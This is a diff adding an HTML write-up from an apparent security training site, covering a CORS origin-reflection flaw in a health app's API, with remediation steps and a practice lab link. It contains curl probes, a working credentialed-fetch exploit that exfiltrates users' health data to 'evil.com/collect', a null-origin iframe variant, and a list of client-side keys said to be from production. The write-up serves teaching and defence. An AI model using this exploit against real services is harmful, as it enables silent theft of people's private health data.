@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Reflects Any Origin: Silent Health Data Theft - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/cors/level1.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High &middot; CVSS 8.1</span>
+      <span class="writeup-category">CORS &middot; Data Theft &middot; Health Data</span>
+    </div>
+
+    <h1>CORS Reflects Any Origin: Silent Health Data Theft</h1>
+    <div class="writeup-author">Inspired by <strong>Vitor Falcao</strong>'s CORS hunting methodology &middot; 200M+ users affected</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>The API at <code>api.healthapp.com</code> reflects <strong>any origin</strong> &mdash; including arbitrary external domains and the <code>null</code> origin &mdash; with <code>Access-Control-Allow-Credentials: true</code> and <code>Access-Control-Expose-Headers: *</code>. The application uses cookie-based authentication. Any website on the internet can silently make authenticated API requests and read the responses, stealing health data, food diaries, exercise logs, and account information.</p>
+    </div>
+
+    <h2>The Discovery</h2>
+    <p>A single curl command revealed the misconfiguration:</p>
+
+    <pre><code>curl -s -D- -o /dev/null \
+  -H "Origin: https://evil.com" \
+  "https://api.healthapp.com/"
+
+# Response headers:
+access-control-allow-origin: https://evil.com
+access-control-allow-credentials: true
+access-control-expose-headers: *
+set-cookie: anon-device-id=...; Domain=healthapp.com; Path=/; Secure</code></pre>
+
+    <p>Three critical CORS misconfigurations in one response:</p>
+    <ul>
+      <li><strong>Reflects any origin</strong> &mdash; not just subdomains, but <code>evil.com</code>, <code>attacker.xyz</code>, anything</li>
+      <li><strong>Credentials: true</strong> &mdash; browser sends cookies with cross-origin requests</li>
+      <li><strong>Expose-Headers: *</strong> &mdash; all response headers readable cross-origin (including any auth tokens)</li>
+    </ul>
+
+    <p>Even the <code>null</code> origin is accepted, enabling exploitation via sandboxed iframes:</p>
+
+    <pre><code>curl -s -D- -o /dev/null \
+  -H "Origin: null" \
+  "https://api.healthapp.com/"
+
+# access-control-allow-origin: null
+# access-control-allow-credentials: true</code></pre>
+
+    <h2>Why "Any Origin" is Worse Than You Think</h2>
+    <p>Many developers confuse CORS wildcard (<code>*</code>) with origin reflection. Browsers block <code>Access-Control-Allow-Origin: *</code> with <code>credentials: true</code>. But reflecting the exact requesting origin bypasses this protection:</p>
+
+    <pre><code>// This is BLOCKED by browsers:
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+// Browser: "Cannot use wildcard with credentials"
+
+// This is ALLOWED by browsers:
+Access-Control-Allow-Origin: https://evil.com  // Reflected!
+Access-Control-Allow-Credentials: true
+// Browser: "Origin matches, credentials allowed, proceed"
+
+// Server-side code that causes this:
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  res.header('Access-Control-Allow-Origin', origin); // Reflects ANY origin
+  res.header('Access-Control-Allow-Credentials', 'true');
+  next();
+});</code></pre>
+
+    <h2>Exploitation</h2>
+    <p>The exploit is trivially simple &mdash; just a few lines of JavaScript on any website:</p>
+
+    <pre><code>&lt;!-- This works from ANY website on the internet --&gt;
+&lt;script&gt;
+// Steal the victim's food diary
+fetch('https://api.healthapp.com/v2/diary?date=2026-04-14', {
+  credentials: 'include'
+}).then(r => r.json()).then(diary => {
+
+  // Steal their profile
+  return fetch('https://api.healthapp.com/v2/me', {
+    credentials: 'include'
+  }).then(r => r.json()).then(profile => ({diary, profile}));
+
+}).then(({diary, profile}) => {
+
+  // Steal their body measurements
+  return fetch('https://api.healthapp.com/v2/measurements', {
+    credentials: 'include'
+  }).then(r => r.json()).then(measurements =>
+    ({diary, profile, measurements}));
+
+}).then(data => {
+  // Exfiltrate everything to attacker server
+  navigator.sendBeacon('https://evil.com/collect',
+    JSON.stringify(data));
+});
+&lt;/script&gt;</code></pre>
+
+    <p>The attacker can also use the <code>null</code> origin via a sandboxed iframe for a more stealthy approach:</p>
+
+    <pre><code>&lt;!-- Sandboxed iframe sends Origin: null --&gt;
+&lt;iframe sandbox="allow-scripts" srcdoc="
+  &lt;script&gt;
+  fetch('https://api.healthapp.com/v2/me', {
+    credentials: 'include'
+  }).then(r => r.json()).then(data => {
+    parent.postMessage(data, '*');
+  });
+  &lt;/script&gt;
+"&gt;&lt;/iframe&gt;
+
+&lt;script&gt;
+window.addEventListener('message', e => {
+  console.log('Stolen via null origin:', e.data);
+});
+&lt;/script&gt;</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>This app has 200M+ users and stores extremely sensitive health data: complete eating history, exercise routines, body measurements, weight goals, medical dietary restrictions, and payment information. The attack is <strong>completely silent</strong> &mdash; no popups, no redirects, no user interaction beyond visiting a page. The victim's browser does all the work. Previously suffered a 150M account breach &mdash; this CORS misconfiguration enables the same level of data theft from any website.</p>
+    </div>
+
+    <div class="attack-flow">
+      <h4>Attack Scenario</h4>
+      <div class="flow-step"><div class="flow-num">1</div><p>Attacker creates a page with the exploit JS (or compromises a popular site via ad injection)</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">2</div><p>Victim visits the page while logged into the health app (cookie-based auth)</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">3</div><p>Browser makes credentialed cross-origin requests to the API</p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">4</div><p>API reflects the attacker's origin with <code>credentials: true</code></p></div>
+      <div class="flow-arrow">&darr;</div>
+      <div class="flow-step"><div class="flow-num">5</div><p>Browser allows the attacker's JS to read the response &mdash; all health data, profile, measurements exfiltrated</p></div>
+    </div>
+
+    <h2>Bonus: Client-Side Secrets Exposed</h2>
+    <p>The page source also revealed production credentials embedded in client-side code:</p>
+    <pre><code>// Found in window.__ENV:
+STRIPE_PUBLISHABLE_KEY: "pk_live_feE27wU6f0bvDJBvFoK2iyOB"
+DATADOG_CLIENT_TOKEN: "pub955b81ca94fa5d46b806064b78c7abf0"
+AMPLITUDE_API_KEY: "2746a27a28431837e776d192ed6db604"
+FACEBOOK_CLIENT_ID: "186796388009496"
+DD_VERSION: "21.6.1_d6082879b16b"  // Git commit hash</code></pre>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>CORS testing should be one of the first things you do on any target. Three curl commands: (1) <code>-H "Origin: https://evil.com"</code>, (2) <code>-H "Origin: https://evil.target.com"</code>, (3) <code>-H "Origin: null"</code>. Check for <code>access-control-allow-credentials: true</code> in the response. If any of these reflect with credentials, check what API endpoints are accessible &mdash; user data, session info, financial data. The more sensitive the data, the higher the bounty. Health/financial data CORS = almost always Critical.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Implement a strict CORS origin allowlist &mdash; only reflect known frontend domains</li>
+      <li>Never reflect the <code>null</code> origin with credentials</li>
+      <li>Remove <code>Access-Control-Expose-Headers: *</code> &mdash; only expose necessary headers</li>
+      <li>Move from cookie-based auth to token-based auth (<code>Authorization</code> header) for API calls</li>
+      <li>Add <code>SameSite=Strict</code> to auth cookies as defense-in-depth</li>
+      <li>Remove production credentials from client-side <code>__ENV</code></li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: CORS Wildcard with Credentials &mdash; login as victim, then steal their data from a simulated attacker page.</p>
+      </div>
+      <a href="/labs/cors/level1.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/oauth-dirty-dancing">&larr; OAuth Dirty Dancing</a>
+      <a href="/writeups/postmessage-pii-exfiltration">PostMessage PII Exfiltration &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
